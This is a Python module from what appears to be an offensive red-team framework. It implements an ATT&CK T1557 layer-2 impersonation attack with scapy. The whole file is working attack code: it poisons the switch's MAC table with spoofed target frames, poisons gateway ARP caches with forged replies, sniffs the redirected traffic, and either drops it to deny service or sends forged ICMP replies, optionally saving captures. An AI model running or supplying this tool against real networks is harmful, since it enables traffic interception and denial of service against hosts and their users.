"""
Data Link Layer Impersonation — T1557

Impersonates a host at L2 by combining CAM poisoning (overwrite the switch MAC
table entry) with ARP poisoning (overwrite gateway ARP cache). Traffic destined
for the target is redirected to the attacker.

Two modes:
  black_hole  — drop intercepted packets (DoS from the network perspective)
  white_hole  — send fake replies (transparent interception)
"""
import os
import random
import threading
import time

from scapy.all import (ARP, ICMP, IP, Ether, PcapWriter,
                       get_if_addr, get_if_hwaddr, sendp, sniff, srp)

NAME = "impers"
DESCRIPTION = "L2 impersonation (CAM + ARP poison) — black-hole or intercept mode"
ATTCK_ID = "T1557"


# ── Framework interface ────────────────────────────────────────────────────────

def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(
        NAME,
        help=f"{DESCRIPTION} ({ATTCK_ID})",
        description=__doc__,
    )
    _add_args(p)
    add_engagement_args(p)
    p.set_defaults(func=run)


def run(args, logger):
    logger.info(
        "START | technique=%s | iface=%s | target=%s | mode=%s | duration=%ds",
        ATTCK_ID, args.interface, args.target_ip, args.mode, args.duration,
    )
    ok = _execute(args, logger)
    logger.info("END | success=%s", ok)
    return 0 if ok else 1


# ── Argument definition ────────────────────────────────────────────────────────

def _add_args(p):
    p.add_argument("--interface", "-i", required=True)
    p.add_argument("--target-ip",   "-ti", required=True)
    p.add_argument("--target-mac",  "-tm", help="Skip to auto-resolve via ARP")
    p.add_argument("--attacker-ip", "-ai", help="Default: local interface IP")
    p.add_argument("--mode", choices=["black_hole", "white_hole"],
                   default="black_hole",
                   help="black_hole=drop | white_hole=fake reply")
    p.add_argument("--duration", "-d", type=int, default=300)
    p.add_argument("--pcap", nargs="?", const="default",
                   help="PCAP path (default: ~/RapidStrike/impers.pcap)")


# ── Core logic ────────────────────────────────────────────────────────────────

def _execute(args, logger=None):
    _log = logger.info if logger else print

    target_mac = args.target_mac or _resolve_mac(args.target_ip, args.interface)
    if not target_mac:
        _log("[IMPERS] Could not resolve target MAC address")
        return False

    attacker_ip  = args.attacker_ip or get_if_addr(args.interface)
    attacker_mac = get_if_hwaddr(args.interface)

    pcap_writer = None
    if args.pcap:
        path = (args.pcap if args.pcap != "default"
                else os.path.expanduser("~/RapidStrike/impers.pcap"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        pcap_writer = PcapWriter(path, append=True, sync=True)

    atk = _Impersonation(
        iface=args.interface,
        target_ip=args.target_ip, target_mac=target_mac,
        attacker_ip=attacker_ip, attacker_mac=attacker_mac,
        mode=args.mode, pcap_writer=pcap_writer, logger=logger,
    )
    atk.start()
    _log(f"[IMPERS] Running {args.duration}s")
    time.sleep(args.duration)
    atk.stop()

    if pcap_writer:
        pcap_writer.close()
    return True


def _resolve_mac(ip, iface):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered = srp(pkt, timeout=2, verbose=False, iface=iface)[0]
    return answered[0][1].hwsrc if answered else None


# ── Attack class ──────────────────────────────────────────────────────────────

class _Impersonation:
    def __init__(self, iface, target_ip, target_mac, attacker_ip,
                 attacker_mac, mode, pcap_writer, logger):
        self.iface        = iface
        self.target_ip    = target_ip
        self.target_mac   = target_mac
        self.attacker_ip  = attacker_ip
        self.attacker_mac = attacker_mac
        self.mode         = mode
        self.pcap_writer  = pcap_writer
        self._log         = logger.info if logger else print
        self.active       = False
        self.stats        = dict(cam=0, arp=0, intercepted=0, dropped=0, fake=0)
        self.gateways     = self._scan_gateways()

    def start(self):
        self.active = True
        for t in [
            threading.Thread(target=self._cam_loop,     daemon=True),
            threading.Thread(target=self._arp_loop,     daemon=True),
            threading.Thread(target=self._sniff_loop,   daemon=True),
            threading.Thread(target=self._stats_loop,   daemon=True),
        ]:
            t.start()

    def stop(self):
        self.active = False
        s = self.stats
        self._log(f"[IMPERS] Summary — CAM:{s['cam']} ARP:{s['arp']} "
                  f"Intercepted:{s['intercepted']} Dropped:{s['dropped']} "
                  f"FakeReply:{s['fake']}")

    def _scan_gateways(self):
        ip_parts = get_if_addr(self.iface).split(".")
        base = ".".join(ip_parts[:3])
        candidates = [f"{base}.1", f"{base}.254", f"{base}.100"]
        gateways = []
        for gw_ip in candidates:
            mac = _resolve_mac(gw_ip, self.iface)
            if mac:
                gateways.append({"ip": gw_ip, "mac": mac})
                self._log(f"[IMPERS] Found gateway: {gw_ip} ({mac})")
        return gateways

    def _cam_loop(self):
        ip_parts = get_if_addr(self.iface).split(".")
        base = ".".join(ip_parts[:3])
        while self.active:
            for _ in range(5):
                dst_ip = f"{base}.{random.randint(1,254)}"
                pkt = (Ether(src=self.target_mac, dst="ff:ff:ff:ff:ff:ff") /
                       IP(src=self.target_ip, dst=dst_ip) / ICMP())
                sendp(pkt, iface=self.iface, verbose=False)
                self.stats["cam"] += 1
            time.sleep(2)

    def _arp_loop(self):
        while self.active:
            for gw in self.gateways:
                pkt = (
                    Ether(src=self.attacker_mac, dst=gw["mac"]) /
                    ARP(op=2, hwsrc=self.attacker_mac, psrc=self.target_ip,
                        hwdst=gw["mac"], pdst=gw["ip"])
                )
                sendp(pkt, iface=self.iface, verbose=False)
                self.stats["arp"] += 1
            time.sleep(4)

    def _sniff_loop(self):
        sniff(iface=self.iface,
              filter=f"ether dst {self.target_mac}",
              prn=self._on_packet,
              stop_filter=lambda _: not self.active,
              store=0)

    def _on_packet(self, pkt):
        if not self.active:
            return
        self.stats["intercepted"] += 1
        if self.pcap_writer:
            self.pcap_writer.write(pkt)
        self._log(f"[IMPERS] Intercepted #{self.stats['intercepted']}")

        if self.mode == "black_hole":
            self.stats["dropped"] += 1
        elif self.mode == "white_hole" and pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
            reply = (
                Ether(src=self.target_mac, dst=pkt[Ether].src) /
                IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq) /
                pkt[ICMP].payload
            )
            sendp(reply, iface=self.iface, verbose=False)
            self.stats["fake"] += 1

    def _stats_loop(self):
        while self.active:
            time.sleep(15)
            s = self.stats
            self._log(f"[IMPERS] Stats — CAM:{s['cam']} ARP:{s['arp']} "
                      f"Intercepted:{s['intercepted']}")
